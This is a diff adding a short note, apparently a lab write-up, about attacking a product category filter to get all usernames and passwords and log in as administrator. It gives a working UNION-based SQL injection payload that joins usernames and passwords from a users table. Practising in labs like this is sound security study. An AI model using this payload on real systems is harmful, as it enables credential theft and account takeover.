@@ -1,0 +1,4 @@
+-Product category filter
+-End Goal: retrieve all usernames and passwords and login as the administrator user.
+
+payload:" ' UNION select NULL, username || '*' || password from users-- "
